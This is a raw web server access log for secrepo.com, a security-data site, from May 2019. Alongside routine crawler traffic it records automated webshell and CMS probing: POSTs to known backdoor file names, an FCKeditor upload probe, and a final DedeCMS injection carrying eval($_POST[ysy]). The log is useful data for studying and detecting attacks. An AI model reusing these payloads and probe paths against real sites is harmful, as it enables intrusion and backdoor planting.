72.21.196.64 - - [07/May/2019:08:48:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0" 
72.21.196.64 - - [07/May/2019:08:48:01 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0" 
72.21.196.64 - - [07/May/2019:08:48:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0" 
46.229.168.140 - - [07/May/2019:08:48:54 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)" 
46.229.168.130 - - [07/May/2019:08:48:54 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)" 
207.46.13.122 - - [07/May/2019:08:50:24 -0700] "GET /self.logs/2016/access.log.2016-09-17.gz HTTP/1.1" 200 5681 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
198.108.66.224 - - [07/May/2019:08:56:52 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 zgrab/0.x" 
198.108.66.224 - - [07/May/2019:08:56:52 -0700] "GET / HTTP/1.1" 200 12455 "http://66.33.221.139:80/" "Mozilla/5.0 zgrab/0.x" 
113.171.224.176 - - [07/May/2019:09:00:11 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
58.250.125.156 - - [07/May/2019:09:00:53 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.117 - - [07/May/2019:09:08:29 -0700] "GET /self.logs/access.log.2017-01-29.gz HTTP/1.1" 200 31420 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.107 - - [07/May/2019:09:09:06 -0700] "GET /self.logs/2016/access.log.2016-08-26.gz HTTP/1.1" 200 5946 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.190 - - [07/May/2019:09:16:19 -0700] "GET /self.logs/access.log.2018-01-12.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.0 - - [07/May/2019:09:19:29 -0700] "GET /self.logs/2015/error.log.2015-03-20.gz HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.67.156 - - [07/May/2019:09:24:00 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.156 - - [07/May/2019:09:24:08 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.164 - - [07/May/2019:09:24:14 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.165 - - [07/May/2019:09:24:16 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.226 - - [07/May/2019:09:24:23 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.156 - - [07/May/2019:09:24:23 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.71.20 - - [07/May/2019:09:24:26 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.156 - - [07/May/2019:09:24:30 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
220.181.108.90 - - [07/May/2019:09:25:15 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.76 - - [07/May/2019:09:25:15 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
158.12.64.37 - - [07/May/2019:09:31:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
222.186.57.34 - - [07/May/2019:09:34:28 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:42 -0700] "POST //lequ.php HTTP/1.1" 404 295 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:47 -0700] "POST //coon.php HTTP/1.1" 404 295 "http://www.secrepo.com//coon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:47 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:47 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:48 -0700] "POST //12345.php HTTP/1.1" 404 294 "http://www.secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:48 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:48 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:48 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:50 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:50 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:51 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:52 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:52 -0700] "POST //Config_Shell.php HTTP/1.1" 404 294 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:53 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:55 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:56 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:56 -0700] "POST //indexa.php HTTP/1.1" 404 294 "http://www.secrepo.com//indexa.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:34:57 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:35:01 -0700] "POST //plus/mybak.php HTTP/1.1" 404 295 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:35:04 -0700] "POST //plus/x.php HTTP/1.1" 404 295 "http://www.secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:35:05 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.34 - - [07/May/2019:09:35:05 -0700] "POST //d.php HTTP/1.1" 404 294 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
61.129.6.225 - - [07/May/2019:09:39:08 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
207.46.13.117 - - [07/May/2019:09:42:18 -0700] "GET /self.logs/access.log.2019-04-07.gz HTTP/1.1" 200 38111 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [07/May/2019:09:45:39 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
108.59.0.37 - - [07/May/2019:09:49:49 -0700] "GET / HTTP/1.1" 200 12511 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
103.109.12.178 - - [07/May/2019:09:50:58 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
103.109.12.178 - - [07/May/2019:09:50:59 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
114.231.80.105 - - [07/May/2019:09:53:53 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:57 -0700] "POST //search.asp HTTP/1.1" 404 295 "http://www.secrepo.com//search.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:57 -0700] "POST //gbook/save.asp HTTP/1.1" 404 294 "http://www.secrepo.com//gbook/save.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:58 -0700] "POST //inc/md5.asp HTTP/1.1" 404 294 "http://www.secrepo.com//inc/md5.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:58 -0700] "POST //member/login.asp HTTP/1.1" 404 294 "http://www.secrepo.com//member/login.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:58 -0700] "POST //plug/vote/vote.asp HTTP/1.1" 404 294 "http://www.secrepo.com//plug/vote/vote.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:59 -0700] "POST //apply/index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//apply/index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:53:59 -0700] "POST //about/index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//about/index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:00 -0700] "POST //index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:00 -0700] "POST //plus/ad_js.php?aid=8888 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/ad_js.php?aid=8888" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:00 -0700] "POST //plus/ad_js.php?aid=8888 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/ad_js.php?aid=8888" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:00 -0700] "POST //plus/ad_js.php?aid=8888 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/ad_js.php?aid=8888" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:01 -0700] "POST //ss.aspx HTTP/1.1" 404 294 "http://www.secrepo.com//ss.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:01 -0700] "POST //ss.aspx HTTP/1.1" 404 294 "http://www.secrepo.com//ss.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:01 -0700] "POST //ss.aspx HTTP/1.1" 404 294 "http://www.secrepo.com//ss.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:02 -0700] "POST //list/index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//list/index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:02 -0700] "POST //admin/login.asp HTTP/1.1" 404 294 "http://www.secrepo.com//admin/login.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:02 -0700] "POST //wap/index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//wap/index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.231.80.105 - - [07/May/2019:09:54:02 -0700] "POST //index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
113.171.224.176 - - [07/May/2019:10:04:50 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.190 - - [07/May/2019:10:08:20 -0700] "GET /self.logs/error.log.2017-07-14.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.190 - - [07/May/2019:10:10:54 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 301 515 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.190 - - [07/May/2019:10:11:03 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
2.152.154.235 - - [07/May/2019:10:14:31 -0700] "GET / HTTP/1.1" 200 12511 "http://127.0.0.1:8888/notebooks/prog_datasci_5/prog_datasci_5_api.ipynb" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
2.152.154.235 - - [07/May/2019:10:14:31 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
2.152.154.235 - - [07/May/2019:10:14:31 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
2.152.154.235 - - [07/May/2019:10:14:31 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0" 
79.122.50.205 - - [07/May/2019:10:20:52 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.122.50.205 - - [07/May/2019:10:20:52 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
216.244.66.245 - - [07/May/2019:10:26:04 -0700] "GET /scada_logs.zip HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.190 - - [07/May/2019:10:26:41 -0700] "GET /self.logs/2015/?C=N;O=D HTTP/1.1" 200 7480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.120.173.159 - - [07/May/2019:10:30:30 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [07/May/2019:10:31:22 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.190 - - [07/May/2019:10:36:18 -0700] "GET /self.logs/access.log.2019-02-18.gz HTTP/1.1" 200 27839 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.67.166 - - [07/May/2019:10:37:02 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.221 - - [07/May/2019:10:37:05 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.165 - - [07/May/2019:10:37:07 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
207.46.13.122 - - [07/May/2019:10:40:53 -0700] "GET /self.logs/error.log.2017-11-06.gz HTTP/1.1" 200 2387 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
111.206.36.139 - - [07/May/2019:10:41:49 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=concernedhwe" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
40.77.167.100 - - [07/May/2019:10:43:07 -0700] "GET /self.logs/error.log.2018-05-25.gz HTTP/1.1" 200 6512 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
108.59.0.37 - - [07/May/2019:10:47:58 -0700] "GET / HTTP/1.1" 200 12511 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
42.106.239.63 - - [07/May/2019:10:51:03 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
42.106.239.63 - - [07/May/2019:10:51:04 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.143 - - [07/May/2019:10:59:10 -0700] "GET /self.logs/2016/access.log.2016-06-06.gz HTTP/1.1" 200 8447 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.1 - - [07/May/2019:10:59:15 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.0 - - [07/May/2019:10:59:18 -0700] "GET /self.logs/2015/error.log.2015-05-20.gz HTTP/1.1" 200 813 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
173.195.59.162 - - [07/May/2019:11:01:54 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
173.195.59.162 - - [07/May/2019:11:01:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
173.195.59.162 - - [07/May/2019:11:01:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
173.195.59.162 - - [07/May/2019:11:01:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36" 
106.120.188.165 - - [07/May/2019:11:02:43 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.122 - - [07/May/2019:11:06:16 -0700] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [07/May/2019:11:06:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.131 - - [07/May/2019:11:13:15 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.131 - - [07/May/2019:11:16:18 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.190 - - [07/May/2019:11:18:59 -0700] "GET /self.logs/access.log.2017-08-28.gz HTTP/1.1" 200 23339 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.190 - - [07/May/2019:11:22:13 -0700] "GET /self.logs/2015/error.log.2015-06-03.gz HTTP/1.1" 200 691 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.98 - - [07/May/2019:11:31:42 -0700] "GET /self.logs/error.log.2018-04-06.gz HTTP/1.1" 200 4944 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.120.188.165 - - [07/May/2019:11:31:45 -0700] "GET / HTTP/1.1" 301 483 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
106.120.188.165 - - [07/May/2019:11:31:46 -0700] "GET / HTTP/1.1" 200 12511 "http://www.sogou.com/web?query=site%3Asecrepo.com" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
106.120.188.165 - - [07/May/2019:11:31:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
106.120.188.165 - - [07/May/2019:11:31:47 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)" 
40.77.167.98 - - [07/May/2019:11:36:58 -0700] "GET /self.logs/2016/error.log.2016-12-24.gz HTTP/1.1" 200 1018 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
122.247.29.159 - - [07/May/2019:11:38:01 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:02 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:02 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:02 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:02 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:03 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:03 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:03 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
